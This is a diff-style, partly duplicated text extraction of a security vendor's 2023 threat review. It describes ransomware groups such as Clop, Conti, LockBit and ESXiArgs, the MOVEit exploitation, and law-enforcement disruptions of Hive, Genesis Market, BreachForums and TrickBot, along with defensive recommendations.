allows individuals to work with anyscheme, and it is likely that, through this process, strong workingrelationships have been built that can be relied on when operationsare disrupted.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review2301Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreRansomwareWhy Some Groups 
+zero\-day
+May 2023
+Figure 9\. Services exploited by GOLD TAHOE in attacks on file transfer solutions. (Source: Secureworks)
+GOLD TAHOE Has Two Strings
+to Its Bow 
+The GOLD TAHOE threat group, operator of Clop ransomware 
+and the Clop Leaks site, has been around for over a decade. Its 
+members have worked with GOLD DRAKE (EvilCorp, Dridex), GOLD 
+BLACKBURN (TrickBot), GOLD NIAGARA (FIN7\), and other well\-
+known threat groups. Perhaps because of these connections, GOLD 
+TAHOE does not openly communicate on any criminal forums. And 
+while the group does not operate its ransomware as a RaaS, it does 
+appear to rely on another group, GOLD NIAGARA, to deliver its 
+ransomware in a private arrangement.
+But the Clop ransomware itself tells only half of the story. While the 
+leak site the group has operated since August 2020 lists victims 
+of its ransomware operations, it also carries the names of those 
+targeted in its attempts at data theft\-only extortion. There are 
+many more names of the latter type than there are of the former; 
+Clop ransomware deployments account for around a quarter of 
+listed victims, while the data theft\-only operation features the 
+remainder. And the bulk of those are from two campaigns from 
+1\. By exploiting zero\-day vulnerabilities in two file management 
+servicesFortra's GoAnywhere MFT in March and Progress 
+Software's MOVEit Transfer application in Maythe group claims 
+to have successfully stolen data from over three hundred victims 
+and possibly as many as six hundred. It is not possible to gauge 
+exactly how many were affected given that the victims named on 
+leak sites constitute those who have not paid the ransom.
+Such activity for a ransomware group is unusual, but it forms the 
+most recent chapter in its exploitation of vulnerabilities to steal 
+and ransom victim data. Since late 2020, the group has sought to 
+exploit both zero\-day and N\-day vulnerabilities in file management 
+applications to extort the users of such services. Their use of zero\-
+day vulnerabilities is notable, and shows how well\-resourced the 
+group iszero\-days are expensive to develop or procure, and were 
+historically the domain of state\-sponsored actors.
+22
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Exploiting these services gives the group access to shared files, 
+some of which may come from third parties, as for example in 
+the Zellis payroll compromise8 which formed part of the MOVEit 
+Transfer attacks. And while there is little an organization can do to 
+prevent a breach of a trusted third\-party, especially through the 
+abuse of a zero\-day vulnerability in the vendor's platform, there are 
+some steps organizations can take to detect and mitigate the threat 
+posed by GOLD TAHOE.
+Enforce a retention policy on shared files to ensure data 
+is available for only as long as it is needed. 
+Protect highly sensitive data (like PII) with file level 
+encryption that requires a key that is not stored on the 
+file sharing service. If a platform does not support such 
+a facility, it may not be the best method of sharing this 
+type of data. 
+Encrypt data in transit and at rest.
+Enable alerting that indicates when files are being 
+accessed and monitor for anomalies.
+Implement auditing so that if a breach occurs it can 
+be quickly determined what files were present during 
+relevant time period(s).
+For on\-premises solutions, implement network flow 
+monitoring to detect and alert on large data transfers.
+23
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The Conti ImplosionThe Hydra 
+is Dead but Its Limbs Survive
+The most obvious impact of the conflict in Ukraine on the 
+cybercrime ecosystem was the implosion in the first half of 2022 of 
+GOLD ULRICK, the group behind Conti ransomware. The revelations 
+in the Conti Leaksa large disclosure of information about the 
+group's activity, likely by a Ukrainian affiliate angered at the group's 
+almost immediate declaration of support for Russia's invasion
+preceded the disappearance of Conti ransomware by a few months. 
+While the full reasons for its dissolution remain unclear, it is likely 
+that affiliates were concerned about damage to the Conti name that 
+might make it harder for victims to pay. GOLD ULRICK may also have 
+been disconcerted by the U.S. Department of State announcing9 
+in May 2022 a $10 million reward for information leading to the 
+identification or location of key leaders behind the Conti ransomware 
+operation. Such unwanted scrutiny may have also been a cause for 
+the group's disappearance.
+However, that did not mean that group members remained absent 
+from the ransomware ecosystem for long. Unlike previous disruptions 
+to ransomware activities that have resulted in rebrands, such as 
+Darkside's rebranding as BlackMatter, the group instead apparently 
+turned to other existing operations. As a result, Conti members and 
+affiliates began to work with other ransomware groups. 
+One affiliate was observed going on to work with LockBit, Suncrypt 
+and Monti ransomware operations after Conti's demise. The apparent 
+leader of the Conti ransomware operationrevealed as Stern in 
+the Conti chat logswas subsequently observed10 transacting with 
+Quantum, Karakurt, Diavol, and Royal ransomware schemes. Other 
+schemes, such as BlackBasta and Nokoyawa, have also been linked11 
+to former Conti operators. 
+These observations demonstrate adaptability within a broad network 
+of criminals, whose relationships allow for cooperation to meet 
+common ends. The ransomware ecosystem is not made up of 
+monolithic units that operate within their own closed spheres. The 
+ransomware\-as\-a\-service model allows individuals to work with any 
+scheme, and it is likely that, through this process, strong working 
+relationships have been built that can be relied on when operations 
+are disrupted.
+24
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+RansomwareWhy Some Groups 
 Stay the Course and Others Fall at 
-the First Hurdlefollowing their widescale exploitation of the MOVEit Transfer zero\-day vulnerability to steal data from multiple victims, Clop operatorGOLD TAHOE announced15 they had deleted data related to anygovernment, city or police service. Despite this, they have listedpublic sector victims on their leak site from several countries.Tor is littered with ransomware group leak sites that never list morethan a few victims. Groups with three or fewer victim listings in theOperating a private ransomware group or exercising tight controlpast year include Vendetta, Dunghill Leak, and CrossLock. Whatmakes some groups successful, and others a flash in the pan?over affiliates makes avoiding certain victims in this way much easierto achieve than it can be in less rigidly managed organizations.To survive and flourish in a competitive market and to avoidFor example, GOLD MYSTIC's loosely managed affiliate modeldisruption, ransomware operators and their affiliates need to walkdelegating the responsibility of victim selection, ransom negotiationa fine line between impact and scrutiny. They need victims to pay;and payment distribution to the affiliatebrings considerableForced to Evolvetheir ability to take business operations offline and steal data that theadvantages in terms of scale, something that the number of LockBit0506State\-SponsoredThreat Activityvictim does not want to be made public are crucial elements of that.attacks every month demonstrates. However, it also means thatThey also want victims to know that they are serious and that payingsome affiliates may behave in ways that bring unwanted attention.them will likely result in a successful outcome. This builds reputation.In December 2022, after a LockBit affiliate targeted a children'sBut the more effective they become, the more scrutiny they facehospital in Toronto, Canada, an apology was posted16 to the leak sitefrom government agencies and law enforcement operations.and a free decryptor was allegedly provided to enable the hospital torecover files and access. GOLD MYSTIC also claimed to have bannedThreat Actor Use ofArtificial IntelligenceAlthough issues of jurisdiction remain a challenge, law enforcementthe affiliate from working again with the group. In a further example,has clearly demonstrated an ability in recent years to disrupt if notLockBitSupp, the self\-proclaimed leader of GOLD MYSTIC, appearedprosecute ransomware operators and their affiliates. They recoveredunaware that Royal Mail had been attacked by LockBit until thestolen funds12 in 2021 following the Darkside Colonial Pipeline attack,organization's name appeared on the LockBit leak site.07Conclusion08Appendixissued sanctions13 in February 2023 against individuals engaged inTrickBot and Conti ransomware operations, and infiltrated14 the Hiveransomware operation and took its infrastructure offline.As a result, many groups publicly ban the targeting of critical nationalinfrastructure, government organizations and the healthcare andeducation verticals in the hope of avoiding scrutiny. For example,2023 State of the Threat: A Year in Review2401Letter From Our VPHowever, some groups are simply less scrupulousVice Society,ESXi servers worldwide were compromised in this campaign. Thisoperated by GOLD VICTOR, specialized in targeting education andis despite a patch being available since February 23, 2021\. ESXiArgshealthcare organizations until it became dormant in late June 2023,ransomware has been observed only partially encrypting files largerand then possibly returned17 as Rhysida ransomware, which alsothan 128MB. Smaller files are fully encrypted.0203Executive Summaryand Key Findingstargets healthcare and education.Reasons for this spate of new variants appear based on theThe Business of CybercrimeIs Boomtime Back?Ransomware groups also need to be adaptable to survive andperception that ESXi environments are in general less well protectedprosper. There has been an increase in the number of ransomwareand instrumented than Windows environments. The impact ofgroups with Linux variants that are designed to encrypt VMware ESXiencrypting a single ESXi host can also be significant, depending onhosts. Third\-party reports suggest that ransomware operations withhow an organization's virtualized environment is set up.such variants now include Royal, Black Basta, LockBit, BlackMatter,AvosLocker, REvil, HelloKitty, RansomEXX, and MichaelKors, as wellIn the past year, Secureworks incident responders have workedas multiple lower profile variants18 based on the Babuk ESXi sourceon multiple ransomware attacks affecting VMware ESXi serverscode leaked in September 2021\. One example is the ESXiArgsconducted by ransomware groups including LockBit, ESXiArgs, andransomware19 operation, which in early 2023 used scan\-and\-exploitALPHV(BlackCat). However, despite attempts by LockBit to launch ato conduct a wave of ransomware attacks targeting an OpenSLPmacOS encryptor, post\-intrusion ransomware aimed at the macOSheap\-overflow vulnerability (CVE\-2021\-21974\) in VMware ESXienvironment remains rare.hypervisors. Both the French and Italian cyber security agenciesissued advisories, with reports that approximately 3,200 VMwareInnovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review2501Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Fighting Back, but With How 
-Much Impact?The emphasis placed in 2021 by the Biden\-Harris administrationon combatting cybercrime and other threat actor activityhas continued throughout the reporting period. Both U.S. lawenforcement and other government agencies, and internationalpartners, have maintained a relatively high tempo of activity, withwebsite seizures, sanctions, arrest warrants, and more.Innovations in TTPs Occur04When Infection Chains AreForced to EvolveHow much of a long\-term impact all this activity will ultimatelyhave remains to be seen. On the one hand, some ransomwaregroups appear to have continued to avoid attacking criticalinfrastructure organizations, as discussed above. This could bedeliberate to avoid drawing law enforcement attention, but theU.S.'s focus20 on improving cybersecurity in critical infrastructuresectors may be paying rewards.On the other hand, threat actors quickly regroup and adapt,particularly when operating in jurisdictions beyond the reach of theinvestigating bodies. Where there is no real risk of arrest, and assetseizure is difficult, the incentive to get out of the crime businessaltogether just is not there. Furthermore, economic sanctions,which appear to have particularly impacted the technologysector21, might even in some cases have the effect of driving someindividuals out of employment and into cybercrime.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixJANUARY 16, 2023Hive ransomware 
+the First Hurdle
+Tor is littered with ransomware group leak sites that never list more 
+than a few victims. Groups with three or fewer victim listings in the 
+past year include Vendetta, Dunghill Leak, and CrossLock. What 
+makes some groups successful, and others a flash in the pan?
+To survive and flourish in a competitive market and to avoid 
+disruption, ransomware operators and their affiliates need to walk 
+a fine line between impact and scrutiny. They need victims to pay; 
+their ability to take business operations offline and steal data that the 
+victim does not want to be made public are crucial elements of that. 
+They also want victims to know that they are serious and that paying 
+them will likely result in a successful outcome. This builds reputation. 
+But the more effective they become, the more scrutiny they face 
+from government agencies and law enforcement operations. 
+Although issues of jurisdiction remain a challenge, law enforcement 
+has clearly demonstrated an ability in recent years to disrupt if not 
+prosecute ransomware operators and their affiliates. They recovered 
+stolen funds12 in 2021 following the Darkside Colonial Pipeline attack, 
+issued sanctions13 in February 2023 against individuals engaged in 
+TrickBot and Conti ransomware operations, and infiltrated14 the Hive 
+ransomware operation and took its infrastructure offline. 
+As a result, many groups publicly ban the targeting of critical national 
+infrastructure, government organizations and the healthcare and 
+education verticals in the hope of avoiding scrutiny. For example, 
+following their widescale exploitation of the MOVEit Transfer zero\-
+day vulnerability to steal data from multiple victims, Clop operator 
+GOLD TAHOE announced15 they had deleted data related to any 
+government, city or police service. Despite this, they have listed 
+public sector victims on their leak site from several countries. 
+Operating a private ransomware group or exercising tight control 
+over affiliates makes avoiding certain victims in this way much easier 
+to achieve than it can be in less rigidly managed organizations.
+For example, GOLD MYSTIC's loosely managed affiliate model
+delegating the responsibility of victim selection, ransom negotiation 
+and payment distribution to the affiliatebrings considerable 
+advantages in terms of scale, something that the number of LockBit 
+attacks every month demonstrates. However, it also means that 
+some affiliates may behave in ways that bring unwanted attention. 
+In December 2022, after a LockBit affiliate targeted a children's 
+hospital in Toronto, Canada, an apology was posted16 to the leak site 
+and a free decryptor was allegedly provided to enable the hospital to 
+recover files and access. GOLD MYSTIC also claimed to have banned 
+the affiliate from working again with the group. In a further example, 
+LockBitSupp, the self\-proclaimed leader of GOLD MYSTIC, appeared 
+unaware that Royal Mail had been attacked by LockBit until the 
+organization's name appeared on the LockBit leak site.
+25
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+However, some groups are simply less scrupulousVice Society, 
+operated by GOLD VICTOR, specialized in targeting education and 
+healthcare organizations until it became dormant in late June 2023, 
+and then possibly returned17 as Rhysida ransomware, which also 
+targets healthcare and education. 
+Ransomware groups also need to be adaptable to survive and 
+prosper. There has been an increase in the number of ransomware 
+groups with Linux variants that are designed to encrypt VMware ESXi 
+hosts. Third\-party reports suggest that ransomware operations with 
+such variants now include Royal, Black Basta, LockBit, BlackMatter, 
+AvosLocker, REvil, HelloKitty, RansomEXX, and MichaelKors, as well 
+as multiple lower profile variants18 based on the Babuk ESXi source 
+code leaked in September 2021\. One example is the ESXiArgs 
+ransomware19 operation, which in early 2023 used scan\-and\-exploit 
+to conduct a wave of ransomware attacks targeting an OpenSLP 
+heap\-overflow vulnerability (CVE\-2021\-21974\) in VMware ESXi 
+hypervisors. Both the French and Italian cyber security agencies 
+issued advisories, with reports that approximately 3,200 VMware 
+ESXi servers worldwide were compromised in this campaign. This 
+is despite a patch being available since February 23, 2021\. ESXiArgs 
+ransomware has been observed only partially encrypting files larger 
+than 128MB. Smaller files are fully encrypted.
+Reasons for this spate of new variants appear based on the 
+perception that ESXi environments are in general less well protected 
+and instrumented than Windows environments. The impact of 
+encrypting a single ESXi host can also be significant, depending on 
+how an organization's virtualized environment is set up.
+In the past year, Secureworks incident responders have worked 
+on multiple ransomware attacks affecting VMware ESXi servers 
+conducted by ransomware groups including LockBit, ESXiArgs, and 
+ALPHV(BlackCat). However, despite attempts by LockBit to launch a 
+macOS encryptor, post\-intrusion ransomware aimed at the macOS 
+environment remains rare.
+26
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+U.S. and UK sanctions 
+announced against 
+TrickBot operators 
+FEBRUARY 9, 2023
+Hive ransomware 
 infrastructure taken 
-down by FBIMARCH 24, 2023Breachforums admin 
-arrested by FBIJUNE 16, 2023Mikhail Matveev, 31, 
+down by FBI 
+JANUARY 16, 2023
+Breachforums admin 
+arrested by FBI 
+MARCH 24, 2023
+Genesis Market 
+disruption and arrests 
+APRIL 4, 2023
+Mikhail Matveev, 31, 
 aka "Wazawaka" Babuk 
 operator indicted and 
-sanctionedFEBRUARY 9, 2023U.S. and UK sanctions 
-announced against 
-TrickBot operatorsAPRIL 4, 2023Genesis Market 
-disruption and arrestsFigure 10\. Law enforcement action timeline 2023\. (Source: Secureworks)2023 State of the Threat: A Year in Review2601Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixGenesis Market's Temporary 
-ExodusThe takedown at the beginning of April 2023 of Genesis Market'sclearnet website appeared to have an impact on user confidence,at least at first. However, despite the takedown attempt, GenesisMarket remained functional on the Tor network, albeit with the speedlimitations of hosting it on that network. It was clear that the 119arrests associated with the takedown, conducted under the name ofOperation Cookie Monster, targeted users of the Genesis Market, notthe owners or admins.While the restocking of logs initially paused for several weeks inlate April, findings by CTU researchers indicated that the operatorsbehind the market remained active, with 1,874 new logs added tothe site in May. On April 4, the day of the clear web takedown, therewere 468,275 logs stored on the clear website. On April 5, there were468,480 stored on the Tor site (the data was almost the same asboth domains pointed at the same servers). On June 6, the numberof logs on the Tor site had increased to 471,284\. However, given theimpact that the arrests had on user confidence, that small increasedoes not necessarily mean that sales figures increased or evenremained the same.s
-g
-olf
-o
-r
-e
-b
-m
-u
-NFigure 11\. Logs on Genesis Market, before and after the Clearnet website takedown. (Source: Secureworks)2023 State of the Threat: A Year in Review27400,000410,000420,000430,000440,000450,000460,000470,000480,000490,000500,000468,275468,480471,28404042023clearnet05042023Tor06062023Tor01Letter From Our VPThis illustrates how law enforcement can disrupt clearnet activitybut may find it harder to take down services hosted on the darkWhat Made Genesis Market
-So Popular?0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendixweb. Nonetheless, the takedown had clearly sown distrust amongUnlike other marketplaces that typically sell static stolenusers. Chatter on underground forums indicated that some usersdata, the Genesis Market operates a unique, highly functional,thought the re\-emerged site was a honeypot for law enforcement.and easy to use bot system. This is a dynamic system thatSome threat actors were clearly concerned and looking foralternatives. Others may have been deterred by performanceproblems caused by the custom Genesium Browser and extensionneeding to communicate with command and control (C2\)infrastructure over Tor. The takedown may also have spooked thesite owners as, shortly afterwards, in June, they took the Tor sitedown and sold it to an undisclosed buyer.continually updates victim information. This includes capturingchanges to passwords and any new sites the victim accesses.In Genesis Market terminology, the term bot is used to referto malware that constantly updates the market and stolendata, which can include anything from login details to cookiesand digital fingerprints.When a buyer purchases a bot, they are provided with twooptions to exploit the stolen data. They can either use a plugindesigned for their existing web browser or use a dedicatedChromium\-based browser. Both options allow the buyer toimpersonate the victim with their stolen data, with the systemhandling most of the complexity. This makes it very easy forcriminals to use the illicit access that has been obtained. Bothoptions come with anti\-detection features to help the buyerevade security systems.In contrast, markets like the Russian Market typically selltraditional stealer logs. These logs are raw dumps of stoleninformation, including passwords, cookies, credit cardnumbers, and personal identification details, among othersensitive data. However, they do not offer any specializedsoftware for making these logs instantly usable. Buyers willhave to manually configure their systems to utilize the stolendata or use clear\-text usernames and passwords directly.This makes the process more labor\-intensive and technicallydemanding for buyers than Genesis Market's approach.2023 State of the Threat: A Year in Review2801Letter From Our VPBreachForums Breached0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?After operating for a year, BreachForums, the natural successorto RaidForums, which was itself taken down in February 2022,was targeted in March 2023 in a concerted law enforcementoperation led by the FBI. This resulted in the arrest of the ownerand administrator of the site, Conor Brian Fitzpatrick22, who usedthe alias Pompompurin. Fitzpatrick pled guilty23 to hacking andchild pornography possession charges. A second administratorBaphomet subsequently announced that the site would bepermanently closed after expressing concern that some of theInnovations in TTPs Occurbackend servers might have been placed under law enforcement04When Infection Chains Arecontrol. On June 19, the administrator from a rival forum claimedForced to Evolvethat they had compromised a new BreachForums site, set up bythe ShinyHunters threat group with Baphomet. Following thisattack, the new BreachForums database was reportedly leakedacross several platforms, including Telegram.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixHive Ransomware Infrastructure 
-Hived OffIt was not just underground forums and marketplaces that weredisrupted by law enforcement activity this year. In January 2023,an international operation24, led by the FBI in coordination withDutch and German law enforcement agencies, targeted theinfrastructure associated with the Hive ransomware\-as\-a\-service(RaaS), operated by GOLD HAWTHORNE. Websites and serversthat members of the group used to communicate with each otherwere seized, resulting in a disruption that led to the apparentdemise of Hive. Since July 2022, the FBI had allegedly gainedaccess to the group's network, seized decryption keys, and issuedthem to victims of the ransomware\-as\-a\-service (RaaS) scheme.This activity clearly denied the individuals behind the schemecriminal profits while easing the pain of its many victims.2023 State of the Threat: A Year in Review2901Letter From Our VPTrickBot Members Sanctioned0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?In the case of TrickBot, people rather than infrastructure weretargeted. In February 2023, seven individuals associated with theactivities surrounding the development and deployment of TrickBotmalware were jointly sanctioned by the UK Foreign, Commonwealthand Development Office (FCDO) and the U.S. Department of theTreasury's Office of Foreign Assets Control (OFAC). The group,which we track as GOLD BLACKBURN, was heavily embedded withthe operators of the now defunct Conti ransomware scheme, anespecially prolific and sophisticated criminal enterprise operated byInnovations in TTPs OccurGOLD ULRICK. The aim of these sanctions is to prohibit individuals04When Infection Chains Areor organizations in the UK and U.S. from having dealings with theForced to Evolvelisted entities, including making or facilitating payments to them.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixLaundering the seven individuals' proceeds of crime might be harderas a result, impacting their ability to realize their profits. It followsOFAC placing its first sanction on a virtual currency mixer in May2022, due, on that occasion, to the mixer's involvement in facilitatingmoney laundering for the North Korean regime.Law enforcement agencies have long come up against issues ofjurisdiction, which not only impede the ability to identify specificindividuals involved in a cybercriminal operation, but also shield themfrom arrest. These latest attempts at disruption versus prosecutionare a possible attempt to address that. If you can't prosecute threatactors, you can at least frustrate their activities and hamper theirability to make and spend money, travel internationally, or leaveRussia at all.Romcom RAT Blurs the LinesThe war in Ukraine has not permanently damaged the 
+sanctioned 
+JUNE 16, 2023 
+Figure 10\. Law enforcement action timeline 2023\. (Source: Secureworks)
+Fighting Back, but With How 
+Much Impact? 
+The emphasis placed in 2021 by the Biden\-Harris administration 
+on combatting cybercrime and other threat actor activity 
+has continued throughout the reporting period. Both U.S. law 
+enforcement and other government agencies, and international 
+partners, have maintained a relatively high tempo of activity, with 
+website seizures, sanctions, arrest warrants, and more. 
+How much of a long\-term impact all this activity will ultimately 
+have remains to be seen. On the one hand, some ransomware 
+groups appear to have continued to avoid attacking critical 
+infrastructure organizations, as discussed above. This could be 
+deliberate to avoid drawing law enforcement attention, but the 
+U.S.'s focus20 on improving cybersecurity in critical infrastructure 
+sectors may be paying rewards. 
+On the other hand, threat actors quickly regroup and adapt, 
+particularly when operating in jurisdictions beyond the reach of the 
+investigating bodies. Where there is no real risk of arrest, and asset 
+seizure is difficult, the incentive to get out of the crime business 
+altogether just is not there. Furthermore, economic sanctions, 
+which appear to have particularly impacted the technology 
+sector21, might even in some cases have the effect of driving some 
+individuals out of employment and into cybercrime.
+27
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+400,000
+410,000
+420,000
+430,000
+440,000
+450,000
+460,000
+470,000
+480,000
+490,000
+500,000
+468,275
+468,480
+471,284
+04042023
+clearnet
+05042023
+Tor
+06062023
+Tor
+Genesis Market's Temporary 
+Exodus
+The takedown at the beginning of April 2023 of Genesis Market's 
+clearnet website appeared to have an impact on user confidence, 
+at least at first. However, despite the takedown attempt, Genesis 
+Market remained functional on the Tor network, albeit with the speed 
+limitations of hosting it on that network. It was clear that the 119 
+arrests associated with the takedown, conducted under the name of 
+Operation Cookie Monster, targeted users of the Genesis Market, not 
+the owners or admins.
+While the restocking of logs initially paused for several weeks in 
+late April, findings by CTU researchers indicated that the operators 
+behind the market remained active, with 1,874 new logs added to 
+the site in May. On April 4, the day of the clear web takedown, there 
+were 468,275 logs stored on the clear website. On April 5, there were 
+468,480 stored on the Tor site (the data was almost the same as 
+both domains pointed at the same servers). On June 6, the number 
+of logs on the Tor site had increased to 471,284\. However, given the 
+impact that the arrests had on user confidence, that small increase 
+does not necessarily mean that sales figures increased or even 
+remained the same.
+Figure 11\. Logs on Genesis Market, before and after the Clearnet website takedown. (Source: Secureworks) 
+Number of logs
+28
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+This illustrates how law enforcement can disrupt clearnet activity 
+but may find it harder to take down services hosted on the dark 
+web. Nonetheless, the takedown had clearly sown distrust among 
+users. Chatter on underground forums indicated that some users 
+thought the re\-emerged site was a honeypot for law enforcement. 
+Some threat actors were clearly concerned and looking for 
+alternatives. Others may have been deterred by performance 
+problems caused by the custom Genesium Browser and extension 
+needing to communicate with command and control (C2\) 
+infrastructure over Tor. The takedown may also have spooked the 
+site owners as, shortly afterwards, in June, they took the Tor site 
+down and sold it to an undisclosed buyer.
+What Made Genesis Market
+So Popular?
+Unlike other marketplaces that typically sell static stolen 
+data, the Genesis Market operates a unique, highly functional, 
+and easy to use bot system. This is a dynamic system that 
+continually updates victim information. This includes capturing 
+changes to passwords and any new sites the victim accesses.
+In Genesis Market terminology, the term bot is used to refer 
+to malware that constantly updates the market and stolen 
+data, which can include anything from login details to cookies 
+and digital fingerprints.
+When a buyer purchases a bot, they are provided with two 
+options to exploit the stolen data. They can either use a plugin 
+designed for their existing web browser or use a dedicated 
+Chromium\-based browser. Both options allow the buyer to 
+impersonate the victim with their stolen data, with the system 
+handling most of the complexity. This makes it very easy for 
+criminals to use the illicit access that has been obtained. Both 
+options come with anti\-detection features to help the buyer 
+evade security systems.
+In contrast, markets like the Russian Market typically sell 
+traditional stealer logs. These logs are raw dumps of stolen 
+information, including passwords, cookies, credit card 
+numbers, and personal identification details, among other 
+sensitive data. However, they do not offer any specialized 
+software for making these logs instantly usable. Buyers will 
+have to manually configure their systems to utilize the stolen 
+data or use clear\-text usernames and passwords directly. 
+This makes the process more labor\-intensive and technically 
+demanding for buyers than Genesis Market's approach.
+29
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+BreachForums Breached
+After operating for a year, BreachForums, the natural successor 
+to RaidForums, which was itself taken down in February 2022, 
+was targeted in March 2023 in a concerted law enforcement 
+operation led by the FBI. This resulted in the arrest of the owner 
+and administrator of the site, Conor Brian Fitzpatrick22, who used 
+the alias Pompompurin. Fitzpatrick pled guilty23 to hacking and 
+child pornography possession charges. A second administrator 
+Baphomet subsequently announced that the site would be 
+permanently closed after expressing concern that some of the 
+backend servers might have been placed under law enforcement 
+control. On June 19, the administrator from a rival forum claimed 
+that they had compromised a new BreachForums site, set up by 
+the ShinyHunters threat group with Baphomet. Following this 
+attack, the new BreachForums database was reportedly leaked 
+across several platforms, including Telegram.
+Hive Ransomware Infrastructure 
+Hived Off
+It was not just underground forums and marketplaces that were 
+disrupted by law enforcement activity this year. In January 2023, 
+an international operation24, led by the FBI in coordination with 
+Dutch and German law enforcement agencies, targeted the 
+infrastructure associated with the Hive ransomware\-as\-a\-service 
+(RaaS), operated by GOLD HAWTHORNE. Websites and servers 
+that members of the group used to communicate with each other 
+were seized, resulting in a disruption that led to the apparent 
+demise of Hive. Since July 2022, the FBI had allegedly gained 
+access to the group's network, seized decryption keys, and issued 
+them to victims of the ransomware\-as\-a\-service (RaaS) scheme. 
+This activity clearly denied the individuals behind the scheme 
+criminal profits while easing the pain of its many victims.
+30
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+TrickBot Members Sanctioned
+In the case of TrickBot, people rather than infrastructure were 
+targeted. In February 2023, seven individuals associated with the 
+activities surrounding the development and deployment of TrickBot 
+malware were jointly sanctioned by the UK Foreign, Commonwealth 
+and Development Office (FCDO) and the U.S. Department of the 
+Treasury's Office of Foreign Assets Control (OFAC). The group, 
+which we track as GOLD BLACKBURN, was heavily embedded with 
+the operators of the now defunct Conti ransomware scheme, an 
+especially prolific and sophisticated criminal enterprise operated by 
+GOLD ULRICK. The aim of these sanctions is to prohibit individuals 
+or organizations in the UK and U.S. from having dealings with the 
+listed entities, including making or facilitating payments to them. 
+Laundering the seven individuals' proceeds of crime might be harder 
+as a result, impacting their ability to realize their profits. It follows 
+OFAC placing its first sanction on a virtual currency mixer in May 
+2022, due, on that occasion, to the mixer's involvement in facilitating 
+money laundering for the North Korean regime. 
+Law enforcement agencies have long come up against issues of 
+jurisdiction, which not only impede the ability to identify specific 
+individuals involved in a cybercriminal operation, but also shield them 
+from arrest. These latest attempts at disruption versus prosecution 
+are a possible attempt to address that. If you can't prosecute threat 
